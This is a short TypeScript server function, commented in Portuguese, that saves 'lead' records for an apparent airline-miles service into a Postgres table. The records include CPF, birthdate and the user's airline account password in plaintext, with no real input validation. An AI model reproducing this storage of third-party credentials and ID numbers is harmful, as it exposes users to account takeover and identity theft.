import { createServerFn } from "@tanstack/react-start";
import sql from "./db";
import type { FlowState } from "./flow-store";

// Esta função roda 100% no servidor (segurança total para suas senhas e banco)
export const salvarLeadNoBanco = createServerFn({ method: "POST" })
  .validator((data: FlowState) => data) // Recebe os dados do formulário
  .handler(async ({ data }: { data: FlowState }) => {
    try {
      // Insere os dados diretamente na tabela criada no Neon
      await sql`
        INSERT INTO leads_milhas (
          nome_completo, cpf, email, companhia, quantidade_milhas, 
          dias_recebimento, senha_conta, email_conta, data_nascimento, 
          saldo_conta, participa_clube
        ) VALUES (
          ${data.accountData.fullName}, 
          ${data.accountData.cpf}, 
          ${data.email || data.accountData.accountEmail}, 
          ${data.airline}, 
          ${data.miles}, 
          ${data.days}, 
          ${data.accountData.accountPassword}, 
          ${data.accountData.accountEmail}, 
          ${data.accountData.birthdate}, 
          ${data.accountData.balance}, 
          ${data.accountData.club}
        )
      `;
      
      return { success: true };
    } catch (error) {
      console.error("Erro ao salvar no Neon:", error);
      throw new Error("Falha ao salvar os dados no banco.");
    }
  });